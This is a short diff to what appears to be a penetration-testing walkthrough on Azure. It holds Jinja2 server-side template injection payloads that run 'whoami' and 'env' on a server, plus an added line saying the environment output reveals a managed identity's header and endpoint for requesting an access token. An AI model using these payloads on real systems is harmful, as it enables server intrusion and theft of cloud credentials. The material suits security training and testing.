@@ -449,6 +449,7 @@ THIS GIVES US ```{Microsoft.Compute/virtualMachines/runCommand/action}```
 {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('env').read()}}
 ```
+ENV will give us the Identity Header which is the ClientID and the Identity Endpoint - copy these down to notepad as per usual
 
 Now Let's request the access token for the managed identity now using the following code:
 ```
